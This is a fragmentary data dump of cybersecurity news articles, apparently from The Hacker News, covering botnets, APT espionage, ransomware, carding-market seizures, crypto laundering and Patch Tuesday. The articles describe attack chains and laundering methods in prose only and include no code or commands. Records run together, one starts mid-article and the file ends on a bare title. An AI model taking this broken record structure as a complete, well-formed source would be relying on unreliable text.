'text': 'A peer-to-peer Golang botnet has resurfaced after more than a year to compromise servers belonging to entities in the healthcare, education, and government sectors within a span of a month, infecting a total of 1,500 hosts.\nDubbed FritzFrog, “the decentralized botnet targets any device that exposes an SSH server — cloud instances, data center servers, routers, etc. — and is capable of running any malicious payload on infected nodes,“ Akamai researchers said in a report shared with The Hacker News.\nThe new wave of attacks commenced in early December 2021, only to pick up pace and register a 10x growth in its infection rate in a month’s time, while peaking at 500 incidents per day in January 2022. The cybersecurity firm said it detected infected machines in a European television channel network, a Russian manufacturer of healthcare equipment, and multiple universities in East Asia.\n\nFritzFrog was first documented by Guardicore in August 2020, elaborating the botnet’s proficiency to strike and infect more than 500 servers spanning across Europe and the U.S. since January that year. A large concentration of the new infections, on the other hand, are located in China.\n“Fritzfrog relies on the ability to share files over the network, both to infect new machines and run malicious payloads, such as the Monero crypto miner,“ security researcher Ophir Harpaz observed in 2020.\nThe botnet’s peer-to-peer (P2P) architecture makes it resilient in that every compromised machine in the distributed network can act as a command-and-control (C2) server as opposed to a single, centralized host. What’s more, the reappearance of the botnet has been accompanied by new additions to its functionality, including the usage of a proxy network and the targeting of WordPress servers.\nThe infection chain propagates over SSH to drop a malware payload that then executes instructions received from the C2 server to run additional malware binaries as well as gather system information and files, before exfiltrating them back to the server.\n\nFritzFrog is notable for the fact that the P2P protocol used is completely proprietary. While earlier versions of the malware process masqueraded as “ifconfig“ and “nginx,“ the recent variants attempt to conceal their activities under the names “apache2“ and “php-fpm.“\nOther new traits incorporated into the malware include the use of secure copy protocol (SCP) to copy itself to the remote server, a Tor proxy chaining to mask outgoing SSH connections, an infrastructure to track WordPress servers for follow-on attacks, and a blocklist mechanism to avoid infecting low-end systems such as Raspberry Pi devices.\n\n“One IP in the blocklist is from Russia. It has multiple open ports and a long list of unpatched vulnerabilities, so it may be a honeypot,“ the researchers said. “Additionally, a second entry points to an open-source botnet sinkhole. These two entries suggest that the operators are attempting to evade detection and analysis.“\nThe inclusion of the SCP feature may also have given the first clue as to the malware’s origins. Akamai pointed out that the library, written in Go, has been shared on GitHub by a user located in the Chinese city of Shanghai.\nA second piece of information linking the malware to China stems from the fact that one of the new wallet addresses employed for crypto mining was also used as part of the Mozi botnet campaign, whose operators were arrested in China last September.\n“These points of evidence, while not damning, lead us to believe a possible link exists to an actor operating in China, or an actor masquerading as Chinese,“ the researchers concluded.\n\n\nFound this article interesting?

{'title': 'COVID Does Not Spread to Computers',
'text': '“…well, of course!“ is what you might think. It’s a biological threat, so how could it affect digital assets?\nBut hang on. Among other effects, this pandemic has brought about a massive shift in several technological areas. Not only did it force numerous organizations - that up to now were reluctant - to gear up in cyber to go digital, all at once, oftentimes with hastily pieced together strategies.\nIt also made remote working (and the involved tools) grow in double-digits, causing the good old perimeter (which was already in a questionable state due to cloud adaption) to be basically shattered. The office is now anywhere. And that means access to data needs to be everywhere too. \nKeeping all of this in mind, the general assumption was that in the wake of the pandemic we would face a virtual nightmare with vulnerable users, compromised corporate networks en masse and the end of the (digital) world. But let’s look at some interesting numbers of what actually happened.\n\nAre hackers locked down too?\nLet’s take a look at the number of droppers we observed in our MDR data and correlate it with other data we have regarding the intensity of COVID lockdown restrictions over time, Droppers are a good overall indicator of malicious activity, as they often indicate an early stage of an attack (which of course we try to prevent in getting any further).\nThe COVID stringency index[1] reflected in the bar chart comes to us from Oxford University and is a composite measure based on nine response indicators, including school closures, workplace closures, and travel bans, rescaled to a value from 0 to 100. In other words, the closer the bar is to 100, the more severe the restrictions at that time. We’ve averaged the indices for the Nordics, Benelux, Germany, France, the UK and South Africa, which represent the bulk of our operational area. \nIt’s also interesting to correlate the data we have from our Threat Detection services, with data we have from observing cyber extortion’ leak sites’ (which we have already written about earlier). \n\nSeveral observations emerge from an examination of the charts above: \nWe observe a distinctive decrease in confirmed downloader activity in the months of November and December 2020 after the Trickbot botnet was taken down by law enforcement, and in January and February 2021, directly after Emotet was taken down. After those two events, downloader activity increases steadily until peaking over the European vacation period in July. \nThere does appear to be a loose correlation between downloaders – which represent the start of the cyber kill chain – and confirmed ransomware activity – which represents the last phase of the kill chain, which is what one would expect. \nDownloader and Ransomware activities both appear to increase over major holiday periods – Easter and mid-summer. We don’t see such a spike over Christmas 2020, but that might be because of the disruptive impact of the Trickbot and Emotet takedowns we alluded to earlier. \nIn general, there appears to be an inverse correlation between the stringency of COVID lockdowns and the volumes of downloader activity. The more stringent the lockdowns, the less of this activity we see. This general observation appears to hold for other forms of malware activity also. As we had already observed in earlier research, this runs contrary to the prevailing narrative that attacks increase when users are working from home. \nIt takes two to make a compromise\nThe conclusion here appears to be, therefore, that the volume trends and patterns in malware activity are overwhelmingly influenced by the patterns and behaviors of the potential victims, not the choices of the attacker. The exception may be vacation periods, where it appears that attackers may step their activity up. \nLaw enforcement activity has a notable impact, but this appears to be short-lived because new actors and new tools tend to pop up after another one is taken down or some of its members arrested. \nSo, the final diagnosis? We can confirm that actually COVID has not spread to digital. At least not in the fatal way that was predicted. And that is finally some good news.\nThis is just another excerpt of the analysis. More details like the incident- and malware distribution across industries or business sizes (as well as a ton of other interesting research topics) can be found in the Security Navigator. It’s available for download on the Orange Cyberdefense website, so have a look.

'text': 'Image Source: TechPrivacy\nCybersecurity authorities from Australia, the U.K., and the U.S. have published a joint advisory warning of an increase in sophisticated, high-impact ransomware attacks targeting critical infrastructure organizations across the world in 2021.\nThe incidents singled out a broad range of sectors, including defense, emergency services, agriculture, government facilities, IT, healthcare, financial services, education, energy, charities, legal institutions, and public services.\n“Ransomware tactics and techniques continued to evolve in 2021, which demonstrates ransomware threat actors’ growing technological sophistication and an increased ransomware threat to organizations globally,“ the agencies said in the joint bulletin.\n\nSpear-phishing, stolen or brute-forced Remote Desktop Protocol (RDP) credentials, and exploitation of software flaws emerged as the top three initial infection vectors that were used to deploy ransomware on compromised networks, even as the criminal business model has morphed into a “professional“ market dominated by different groups of players to gain initial access, negotiate payments, and settle payment disputes.\nBut in a noticeable shift in the wake of highly-publicized attacks on Colonial Pipeline, JBS, and Kaseya last year, ransomware actors pivoted away from “big-game“ hunting in the U.S. in the second half of 2021 to focus on mid-sized victims and evade scrutiny from law enforcement.\n“After encrypting victim networks, ransomware threat actors increasingly used ’triple extortion’ by threatening to (1) publicly release stolen sensitive information, (2) disrupt the victim’s internet access, and/or (3) inform the victim’s partners, shareholders, or suppliers about the incident,“ the agencies said.\nAccording to a new report published by Syhunt this week, over 150 terabytes of data has been stolen from victim organizations by ransomware groups from January 2019 up to January 2022, with REvil alone accounting for 44.1TB of the total stolen information the group siphoned from 282 victims.\n\nAmong other tactics embraced by ransomware groups to maximize impact include striking cloud infrastructures to exploit known weaknesses, breaching managed service providers (MSPs) to access multiple victims through one initial compromise, deploying code designed to sabotage industrial processes, poisoning the software supply chain, and conducting attacks during holidays and weekends.\n\nTo mitigate and reduce the likelihood and impact of ransomware attacks, organizations are being urged to —\nKeep all operating systems and software up to date,Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure,Raise awareness among users about the risks of phishing,Mandate strong, unique passwords and multi-factor authentication to protect accounts from takeover attacks,Encrypt data in the cloud,Implement network segmentation,Disable unnecessary command-line utilities, and restrict scripting activities and permissions,Enforce time-based access for privileged accounts, andMaintain offline (i.e., physically disconnected) backups of data\n“Criminal activity is motivated by financial gain, so paying a ransom may embolden adversaries to target additional organizations or encourage cyber criminals to engage in the distribution of ransomware,“ the agencies cautioned. “Paying the ransom also does not guarantee that a victim’s files will be recovered. Additionally, reducing the financial gain of ransomware threat actors will help disrupt the ransomware criminal business model.“\n\n\nFound this article interesting?

'text': 'A special law enforcement operation undertaken by Russia has led to the seizure and shutdown of four online bazaars that specialized in the theft and sales of stolen credit cards, as the government continues to take active measures against harboring cybercriminals on its territory.\nTo that end, the domains operated by the card fraud forms and marketplaces, Ferum Shop, Sky-Fraud, Trump’s Dumps, and UAS, were confiscated and plastered with a banner that warned “theft of funds from bank cards is illegal.“ Also embedded into the HTML source code was a message asking, “Which one of you is next?“\nThe seizures were orchestrated by the Department “K,“ a division of the Ministry of Internal Affairs of the Russian Federation that focuses primarily on information technology-related crimes, according to Flashpoint. In a related development, state-owned news agency TASS said that six Russian individuals were being charged with “the illegal circulation of means of payment.“\n\nThe four platforms are collectively said to have made over an estimated $263 million across Bitcoin, Litecoin, and Ether, blockchain analytics company Elliptic said. Ferum Shop, active since October 2013, made as much as $256 million in Bitcoin from stolen card sales, accounting for nearly 17% of the stolen credit card market.\nThe UAS Store, a popular seller of stolen remote desktop protocol (RDP) credentials and operational since November 2017, netted around $3 million in cryptocurrency proceeds, with carding store Trump’s Dumps making around $4.1 million since setting up shop in October 2017.\n\nThe crackdown on illicit carding forums marks the third time cybercrime groups operating in the country have been dealt a blow by authorities since the start of the year. It all kicked off with the arrests of 14 members associated with the REvil ransomware gang responsible for numerous cyberattacks worldwide.\nThen on January 25, the FSB arrested Andrey Sergeevich Novak, the alleged leader of the now-defunct Infraud Organization, in Moscow, along with three others for running a criminal enterprise that dabbled in the large-scale acquisition, sale, and distribution of stolen identities, compromised debit and credit cards, personal data, computer malware, and other contraband.\nThe latest high-profile action also comes close on the heels of the law enforcement shutdown of Canadian HeadQuarters (aka CanadianHQ), a darknet marketplace that was involved in the purchase and sale of spam services, phishing kits, stolen credential data dumps, and access to compromised machines.\n\nWhat’s more, recent months have been plagued by the closures of a number of dark web marketplaces like White House Market, Cannazon, ToRReZ, DarkMarket, Monopoly, and UniCC in a move that’s perceived as a major blow to the carding industry after the collapse of the infamous Joker’s Stash in January 2021.\n“Closures and seizures of carding sites in 2022 have so far accounted for almost 50% of sales in the dark web stolen credit card market,“ Elliptic said. “Darknet markets remain highly lucrative enterprises, and if anything, the retirements could give operators the confidence that they can operate a successful market and make their fortunes – without being apprehended.“\n\n\nFound this article interesting?

'text': 'The U.S. Justice Department (DoJ) on Tuesday announced the arrest of a married couple in connection with conspiring to launder cryptocurrency worth $4.5 billion that was siphoned during the hack of the virtual currency exchange Bitfinex in 2016.\nIlya Lichtenstein, 34, and his wife, Heather Morgan, 31, both of New York, are alleged to have “stolen funds through a labyrinth of cryptocurrency transactions,“ with the law enforcement getting hold of over $3.6 billion in cryptocurrency by following the money trails, resulting in the “largest financial seizure ever.“\nProsecutors charged the couple not for the hack itself, but rather for receiving the stolen bitcoin into a digital wallet under their ownership, a part of which was laundered to conceal the activities and the movement of the money. In 2019, Israeli authorities apprehended two brothers, Eli and Assaf Gigi, over their supposed involvement in the 2016 security breach.\n“Bitfinex will work with the DoJ and follow appropriate legal processes to establish our rights to a return of the stolen bitcoin,“ the company said in a statement, adding “We have been cooperating extensively with the DoJ since its investigation began and will continue to do so.“\n\nThe laundering scheme involved moving proceeds of 119,754 bitcoin (BTC) from Bitfinex by initiating more than 2,000 unauthorized transactions that were diverted to a digital wallet under Lichtenstein’s control. Over the past five years, roughly 25,000 stolen bitcoins were then transferred and deposited into financial accounts held by the couple.\n“Beginning in or around January 2017, a portion of the stolen BTC moved out of Wallet 1CGA4s in a series of small, complex transactions across multiple accounts and platforms,“ explained IRS investigator Christopher Janczewski in an affidavit. “This shuffling, which created a voluminous number of transactions, appeared to be designed to conceal the path of the stolen BTC, making it difficult for law enforcement to trace the funds.“\nIlya Lichtenstein and his wife Heather Morgan\nTo achieve this, the defendants are said to have used a number of sophisticated laundering methods, including — \nSetting up online accounts using fake identities,Using software to automate transactions, Depositing stolen funds into accounts at a variety of virtual currency exchanges and darknet markets like AlphaBay and Hydra and then withdrawing the money to obfuscate the transaction trail,Converting bitcoin to other private digital currencies like Monero, a practice known as chain hopping, andMisusing U.S.-based business accounts to legitimize their banking activity\n“Around 21% of the stolen Bitcoins have been moved and laundered over the past five years,“ blockchain analytics firm Elliptic said in a report, noting the use of AlphaBay as a “mixer“ service and the Wasabi Wallet privacy wallet in an attempt to hide the blockchain money pathways.\n\nHowever the DoJ’s seizure and takedown of AlphaBay in July 2017 made it possible for law enforcement to access the service’s internal transaction logs, effectively enabling the tracking of the stolen Bitfinex funds through AlphaBay and to a crypto asset exchange account in the name of Lichtenstein.\n\nPursuant to a court-authorized search warrant of online accounts controlled by the two individuals, law enforcement officials ultimately obtained access to a file saved to Lichtenstein’s cloud storage account that contained the private keys required to access the digital wallet used to receive the funds, enabling the authorities to recover the remainder of more than 94,000 bitcoins.\nBoth Lichtenstein and Morgan have been charged with conspiracy to commit money laundering, which carries a maximum sentence of 20 years in prison, and conspiracy to defraud the U.S, which carries a maximum sentence of five years in prison.\n“Today, federal law enforcement demonstrates once again that we can follow money through the blockchain, and that we will not allow cryptocurrency to be a safe haven for money laundering or a zone of lawlessness within our financial system,“ said Assistant Attorney General Kenneth A. Polite Jr. of the Justice Department’s Criminal Division. “The arrests today show that we will take a firm stand against those who allegedly try to use virtual currencies for criminal purposes.“\n\n\nFound this article interesting?

{'title': 'Guide: Alert Overload and Handling for Lean IT Security Teams',
'text': 'Alarming research reveals the stress and strains the average cybersecurity team experiences on a daily basis. As many as 70% of teams report feeling emotionally overwhelmed by security alerts. Those alerts come at such high volume, high velocity, and high intensity that they become an extreme source of stress. So extreme, in fact, that people’s home lives are negatively affected. Alert overload is bad for those who work in cybersecurity. But it’s even worse for everyone who depends on cybersecurity. \nThis is a gigantic issue in the industry, yet few people even acknowledge it, let alone deal with it. Cynet aims to correct that in this guide (download here), starting by shining a light on the cause of the problem and the full extent of its consequences and then offering a few ways lean security teams can pull their analysts out of the ocean of false positives and get them back to shore. It includes tips on how to reduce alerts using automation and shares guidance for organizations that are considering outsourcing their managed detection and response (MDR). The guide also shares how security teams can detangle the web of security tools necessary for automation.\nSolving alert overload\nSecurity teams of all sizes need to reduce the number of alerts they encounter and refine how they respond to alerts to take action before the damage starts. Below are tactics covered in the guide that security teams, especially lean ones, can use to reduce and respond to thousands of alerts.\n1 — Consider outsourcing to MDR: Outsourcing managed detection and response (MDR) is a good option if you need to scale quickly and don’t have the resources. MDRs can help reduce stress and give your team time back. Another consideration is cost. You also will need to invest time in finding an MDR that’s right for your business. As the guide shows, outsourcing can absolutely be an asset. But it’s never a complete solution.\n2 — Strategize reducing alerts: It starts with strategy. Look at your existing tech and make sure you’ve optimized their settings and your tools are calibrated. Ultimately, it’s not about reducing alerts so much as it’s about how you’ve set your team up to respond.\nFor example, find ways to expedite how you investigate alerts that you can’t eliminate or aggregate. One way is to correlate alarms with known activities, like when a planned patch installation disables security tools in bulk as the system recycles. Any other time, the security team would want to know that security tools are going offline, but there’s a simple explanation during patching. Calibrating tools to “quiet“ alerts during known events or scheduled times will give the security team more time to focus on the actual emergencies.\n3 — Introducing automated response: Even the leanest security teams can tackle threats if they use automation. Automation allows security teams to respond to alerts at scale quickly. But one of the biggest challenges with automation is knowing how to set it up in the first place properly.\nOne of the downsides of automated response we need to try to avoid, happens when an automated response, particularly the kind is driven by machine learning, blocks both malicious and legitimate traffic. These unpredictable instances can be annoying for the security team and for users throughout the organization. Problems can also be hard to undo if the actions taken by automation haven’t been carefully documented along the way. The guide suggests new ways to solve this problem as well. \n4 — Use tools that facilitate automation: Setting up automation is not a ’walk in the park’ because of the abundance of security and IT solutions that need to be integrated (for example, IPS, NDR, EPP, firewalls, DNS filtering, and more.). The key is to know how to put all of these tools in one place – and the guide suggests new ways to do just that.\nIf you want to find out more and learn how to stop alert overload, download the guide here.\n\n\nFound this article interesting?

{'title': 'Iranian Hackers Using New Marlin Backdoor in ’Out to Sea’ Espionage Campaign',
'text': 'An advanced persistent threat (APT) group with ties to Iran has refreshed its malware toolset to include a new backdoor dubbed Marlin as part of a long-running espionage campaign that started in April 2018.\nSlovak cybersecurity company ESET attributed the attacks — codenamed “Out to Sea“ — to a threat actor called OilRig (aka APT34), while also conclusively connecting its activities to a second Iranian group tracked under the name Lyceum (Hexane aka SiameseKitten).\n\n“Victims of the campaign include diplomatic organizations, technology companies, and medical organizations in Israel, Tunisia, and the United Arab Emirates,“ ESET noted in its T3 2021 Threat Report shared with The Hacker News.\nActive since at least 2014, the hacking group is known to strike Middle Eastern governments and a variety of business verticals, including chemical, energy, financial, and telecommunications. In April 2021, the actor targeted a Lebanese entity with an implant called SideTwist, while campaigns previously attributed to Lyceum have singled out IT companies in Israel, Morocco, Tunisia, and Saudi Arabia.\nThe Lyceum infection chains are also notable for the fact that they have evolved to drop multiple backdoors since the campaign came to light in 2018 — beginning with DanBot and transitioning to Shark and Milan in 2021 — with attacks detected in August 2021 leveraging a new data collection malware called Marlin.\n\nThe changes don’t end there. In what’s a significant departure from traditional OilRig TTPs, which have involved the use of DNS and HTTPS for command-and-control (C&C) communications, Marlin makes use of Microsoft’s OneDrive API for its C2 operations. \nESET, noting that initial access to the network was achieved by means of spear-phishing as well as remote access and administration software like ITbrain and TeamViewer, cited similarities in tools and tactics between OilRig’s backdoors and that of Lyceum as “too numerous and specific.“\n\n“The ToneDeaf backdoor primarily communicated with its C&C over HTTP/S but included a secondary method, DNS tunneling, which does not function properly,“ the researchers said. “Shark has similar symptoms, where its primary communication method uses DNS but has a non-functional HTTP/S secondary option.“\nToneDeaf, which supports collecting system information, uploading and downloading of files, and arbitrary shell command execution, is a malware family that was deployed by the APT34 actor targeting a broad range of industries operating in the Middle East in July 2019.\nAdditionally, the findings also pointed out the overlapping use of DNS as a C&C communication channel, while also employing HTTP/S as a secondary communication method and the use of multiple folders in a backdoor’s working directory for uploading and downloading files from the C&C server.\n\n\nFound this article interesting?

'text': 'The Russia-linked threat actor known as APT29 targeted European diplomatic missions and Ministries of Foreign Affairs as part of a series of spear-phishing campaigns mounted in October and November 2021.\nAccording to ESET’s T3 2021 Threat Report shared with The Hacker News, the intrusions paved the way for the deployment of Cobalt Strike Beacon on compromised systems, followed by leveraging the foothold to drop additional malware for gathering information about the hosts and other machines in the same network.\nAlso tracked under the names The Dukes, Cozy Bear, and Nobelium, the advanced persistent threat group is an infamous cyber-espionage group that has been active for more than a decade, with its attacks targeting Europe and the U.S., before it gained widespread attention for the supply‐chain compromise of SolarWinds, leading to further infections in several downstream entities, including U.S. government agencies in 2020.\n\nThe spear-phishing attacks commenced with a COVID-19-themed phishing email impersonating the Iranian Ministry of Foreign Affairs and containing an HTML attachment that, when opened, prompts the recipients to open or save what appears to be an ISO disk image file (“Covid.iso“).\nShould the victim opt to open or download the file, “a small piece of JavaScript decodes the ISO file, which is embedded directly in the HTML attachment.“ The disk image file, in turn, includes an HTML application that’s executed using mshta.exe to run a piece of PowerShell code that ultimately loads the Cobalt Strike Beacon onto the infected system.\n\nESET also characterized APT29’s reliance on HTML and ISO disk images (or VHDX files) as an evasion technique orchestrated specifically to evade Mark of the Web (MOTW) protections, a security feature introduced by Microsoft to determine the origin of a file.\n“An ISO disk image doesn’t propagate the so-called Mark of the Web to the files inside the disk image,“ the researchers said. “As such, and even if the ISO were downloaded from the internet, no warning would be displayed to the victim when the HTA is opened.“\n\nUpon successfully gaining initial access, the threat actor delivered a variety of off-the-shelf tools to query the target’s Active Directory (AdFind), execute commands on a remote machine using SMB protocol (Sharp-SMBExec), carry out reconnaissance (SharpView), and even an exploit for a Windows privilege escalation flaw (CVE-2021-36934) to carry out follow-on attacks.\n“Recent months have shown that The Dukes are a serious threat to western organizations, especially in the diplomatic sector,“ the researchers noted. “They are very persistent, have good operational security, and they know how to create convincing phishing messages.“\n\n\nFound this article interesting?

'text': 'Microsoft on Tuesday rolled out its monthly security updates with fixes for 51 vulnerabilities across its software line-up consisting of Windows, Office, Teams, Azure Data Explorer, Visual Studio Code, and other components such as Kernel and Win32k.\nAmong the 51 defects closed, 50 are rated Important and one is rated Moderate in severity, making it one of the rare Patch Tuesday updates without any fixes for Critical-rated vulnerabilities. This is also in addition to 19 more flaws the company addressed in its Chromium-based Edge browser.\nNone of the security vulnerabilities are listed as under active exploit, while of the flaws — CVE-2022-21989 (CVSS score: 7.8) — has been classified as a publicly disclosed zero-day at the time of the release. The issue concerns a privilege escalation bug in Windows Kernel, with Microsoft warning of potential attacks exploiting the shortcoming.\n\n“Successful exploitation of this vulnerability requires an attacker to take additional actions prior to exploitation to prepare the target environment,“ the company noted in its advisory. “A successful attack could be performed from a low privilege AppContainer. The attacker could elevate their privileges and execute code or access resources at a higher integrity level than that of the AppContainer execution environment.“\nAlso resolved are a number of remote code execution vulnerabilities affecting Windows DNS Server (CVE-2022-21984, CVSS score: 8.8), SharePoint Server (CVE-2022-22005, CVSS score: 8.8), Windows Hyper-V (CVE-2022-21995, CVSS score: 5.3), and HEVC Video Extensions (CVE-2022-21844, CVE-2022-21926, and CVE-2022-21927, CVSS scores: 7.8).\nThe security update also remediates a Azure Data Explorer spoofing vulnerability (CVE-2022-23256, CVSS score: 8.1), two security bypass vulnerabilities each impacting Outlook for Mac (CVE-2022-23280, CVSS score: 5.3) and OneDrive for Android (CVE-2022-23255, CVSS score: 5.9), and two denial-of-service vulnerabilities in .NET (CVE-2022-21986, CVSS score: 7.5) and Teams (CVE-2022-21965, CVSS score: 7.5).\nMicrosoft also said it remediated multiple elevation of privilege flaws — four in the Print Spooler service and one in the Win32k driver (CVE-2022-21996, CVSS score: 7.8), the latter of which has been labeled “Exploitation More Likely“ in light of a similar vulnerability in the same component that was patched last month (CVE-2022-21882) and has come since under active attack.\n\nThe updates arrive as the tech giant late last month republished a vulnerability dating back to 2013 — a signature validation issue affecting WinVerifyTrust (CVE-2013-3900) — noting that the fix is “available as an opt-in feature via reg key setting, and is available on supported editions of Windows released since December 10, 2013.“\nThe move may have been spurred in response to an ongoing ZLoader malware campaign that, as uncovered by Check Point Research in early January, was found leveraging the flaw to bypass the file signature verification mechanism and drop malware capable of siphoning user credentials and other sensitive information.\nSoftware Patches from Other Vendors\nBesides Microsoft, security updates have also been released by other vendors to rectify several vulnerabilities, counting —\nAdobeAndroidCiscoCitrixGoogle ChromeIntelLinux distributions Oracle Linux, Red Hat, and SUSEMozilla Firefox and Firefox ESRSAPSchneider Electric, andSiemens\n\n\nFound this article interesting?

{'title': 'Palestine-Aligned Hackers Use New NimbleMamba Implant in Recent Attacks',
'text': 'An advanced persistent threat (APT) hacking group operating with motives that likely align with Palestine has embarked on a new campaign that takes advantage of a previously undocumented implant called NimbleMamba.\nThe intrusions leveraged a sophisticated attack chain targeting Middle Eastern governments, foreign policy think tanks, and a state-affiliated airline, enterprise security firm Proofpoint said in a report, attributing the covert operation to a threat actor tracked as Molerats (aka TA402).\nNotorious for continuously updating their malware implants and their delivery methods, the APT group was most recently linked to an espionage offensive aimed at human rights activists and journalists in Palestine and Turkey, while a previous attack exposed in June 2021 resulted in the deployment of a backdoor called LastConn.\n\nBut the lull in the activities has been offset by the operators actively working to retool their arsenal, resulting in the development of NimbleMamba, which is designed to replace LastConn, which, in turn, is believed to be an upgraded version of another backdoor called SharpStage that was used by the same group as part of its campaigns in December 2020.\n“NimbleMamba uses guardrails to ensure that all infected victims are within TA402’s target region,“ the researchers said, adding the malware “uses the Dropbox API for both command-and-control as well as exfiltration,“ suggesting its use in “highly targeted intelligence collection campaigns.“\n\nAlso delivered is a trojan dubbed BrittleBush that establishes communications with a remote server to retrieve Base64-encoded commands to be executed on the infected machines. What’s more, the attacks are said to have occurred in tandem with the aforementioned malicious activity targeting Palestine and Turkey.\nThe infection sequence mirrors the exact same technique used by the threat actor to compromise its targets. The spear-phishing emails, which act as the starting point, contain geofenced links that lead to malware payloads — but only if the recipient is in one of the targeted regions. If the targets live outside of the attack radius, the links redirect the user to a benign news website like Emarat Al Youm.\n\nHowever, more recent variations of the campaign in December 2021 and January 2022 have involved the use of Dropbox URLs and attacker-controlled WordPress sites to deliver malicious RAR files containing NimbleMamba and BrittleBush.\nThe development is the latest example of adversaries using cloud services, such as Dropbox, to launch their attacks, not to mention how quickly sophisticated actors can respond to public disclosures of their invasion methods to create something potent and effective that can go past security and detection layers.\n“TA402 continues to be an effective threat actor that demonstrates its persistence with its highly targeted campaigns focused on the Middle East,“ the researchers concluded. “The [two] campaigns demonstrate Molerats’ continued ability to modify their attack chain based on their intelligence targets.“\n\n\nFound this article interesting?

With PPI malware services such as PrivateLoader, malware operators pay the service owners to get their payloads “installed“ based on the targets provided.\n\n“The accessibility and moderate costs allow malware operators to leverage these services as another weapon for rapid, bulk and geo-targeted malware infections,“ cybersecurity firm Intel 471 said in a new report shared with The Hacker News.\n\nPrivateLoader, written in the C++ programming language, is designed to retrieve URLs for the malicious payloads to be deployed on the infected host, with the distribution primarily relying on a network of bait websites that have been rigged to appear prominently in search results via search engine optimization (SEO) poisoning methods targeting users looking for pirated software.\nThe administrative panel used by the PPI service offers a wealth of functions, including adding new users, configuring a link to the payload to be installed, modifying geolocation targeting based on the campaign, and even encrypting the load file.\n\nOther common payload families pushed by PrivateLoader include a mix of remote access trojans, banking malware, and ransomware like DanaBot, Formbook (aka XLoader), CryptBot, Remcos, NanoCore, TrickBot, Kronos, Dridex, NjRAT, BitRAT, Agent Tesla, and LockBit.\n“PPI services have been a pillar of cybercrime for decades,“ the researchers said. “Just like the wider population, criminals are going to flock to software that provides them a wide array of options to easily achieve their goals.“\n\n\nFound this article interesting?

{'title': 'How Attack Surface Management Preempts Cyberattacks',
'text': 'The wide-ranging adoption of cloud facilities and the subsequent mushrooming of organizations’ networks, combined with the recent migration to remote work, had the direct consequence of a massive expansion of organizations’ attack surface and led to a growing number of blind spots in connected architectures.\nThe unforeseen results of this expanded and attack surface with fragmented monitoring has been a marked increase in the number of successful cyber-attacks, most notoriously, ransomware, but covering a range of other types of attacks as well. The main issues are unmonitored blind spots used by cyber-attackers to breach organizations’ infrastructure and escalate their attack or move laterally, seeking valuable information. \nThe problem lies in discovery. Most organizations have evolved faster than their ability to keep track of all the moving parts involved and to catch up to catalog all past and present assets is often viewed as a complex and resource-heavy task with little immediate benefits.\nHowever, given the potential cost of a successful breach and the increased ability of cyber-attackers to identify and use exposed assets, leaving any single one unmonitored can lead to a catastrophic breach. \nThis is where emerging technologies such as Attack Surface Management (ASM) can be invaluable.\nWhat is Attack Surface Management (ASM)?\nASM is a technology that either mines Internet datasets and certificate databases or emulates attackers running reconnaissance techniques. Both approaches aim at performing a comprehensive analysis of your organization’s assets uncovered during the discovery process. Both approaches include scanning your domains, sub-domains, IPs, ports, shadow IT, etc., for internet-facing assets before analyzing them to detect vulnerabilities and security gaps.\nAdvanced ASM includes actionable mitigation recommendations for each uncovered security gap, recommendations ranging from cleaning up unused and unnecessary assets to reduce the attack surface to warning individuals that their email address is readily available and might be leveraged for phishing attacks. \nASM includes reporting on Open-Source Intelligence (OSINT) that could be used in a social engineering attack or a phishing campaign, such as personal information publicly available on social media or even on material such as videos, webinars, public speeches, and conferences.\nUltimately, the goal of ASM is to ensure that no exposed asset is left unmonitored and eliminate any blind spot that could potentially devolve into a point of entry leveraged by an attacker to gain an initial foothold into your system.\nWho needs ASM?\nIn his webinar about the 2021 State of Cybersecurity Effectiveness State, the cyber evangelist David Klein directly addresses the concerning findings that were uncovered by Cymulate’s users adoption of ASM. Unbeknownst to them, prior to running ASM:\n80% did not have anti-spoofing, SPF email records77% had insufficient website protections60% had exposed accounts, infrastructure, and management services58% had hacked email accounts.37% used externally hosted Java.26% had no DMARC record configured for domain.23% had SSL Certificate host mismatch.\nOnce identified, these security gaps could be plugged, but the worrying factor is the extent of the unknown exposure prior to their identification.\nThe ASM users in this analysis are from a large array of industry verticals, regions, and organizations size. This indicates that anyone with a connected infrastructure stands to benefit from adopting ASM as an integral part of their cybersecurity infrastructure.\nWhere can you find ASM?\nThough the technology is still recent, there are a growing number of ASM vendors. As always, it is more efficient to consider adding ASM as a part of a more developed platform rather than a stand-alone product.\nThe focus of an ASM solution is partly dictated by the focus of the basket of products it is associated with. As such, an ASM solution associated with a reactive suite such as Endpoint Detection and Response (EDR) is more likely to me based on expanded scanning abilities, whereas an ASM solution included into a proactive platform such as Extended Security Posture Management (XSPM) is more likely to be focused on leveraging scanning capabilities to expand on emulating cyber-attackers’ recon techniques and tooling.\nSelecting an integrated ASM facilitates centralizing data related to the organization’s security posture in a single-pane-of-glass, reducing the risk of SOC teams’ data overload.\n\n\nFound this article interesting?

'text': 'Microsoft last week announced that it’s temporarily disabling the MSIX ms-appinstaller protocol handler in Windows following evidence that a security vulnerability in the installer component was exploited by threat actors to deliver malware such as Emotet, TrickBot, and Bazaloader.\nMSIX, based on a combination of .msi, .appx, App-V and ClickOnce installation technologies, is a universal Windows app package format that allows developers to distribute their applications for the desktop operating system and other platforms. ms-appinstaller, specifically, is designed to help users install a Windows app by simply clicking a link on a website.\n\nBut a spoofing vulnerability uncovered in Windows App Installer (CVE-2021-43890, CVSS score: 7.1) meant that it could be tricked into installing a rogue app that was never intended to be installed by the user via a malicious attachment used in phishing campaigns.\n\nAlthough Microsoft released initial patches to address this flaw as part of its December 2021 Patch Tuesday updates, the company has now disabled the ms-appinstaller scheme while it works to completely plug the security hole and prevent further exploitation.\n\n“This means that App Installer will not be able to install an app directly from a web server,“ Dian Hartono said. “Instead, users will need to first download the app to their device, and then install the package with App Installer. This may increase the download size for some packages.“\nWith Microsoft yanking support for the protocol, the company is also recommending developers that they update the app download links on their websites by removing “ms-appinstaller:?source=“ schemes so that the MSIX package or.appinstaller file can be downloaded.\n\n\nFound this article interesting?

{'title': 'New CapraRAT Android Malware Targets Indian Government and Military Personnel',
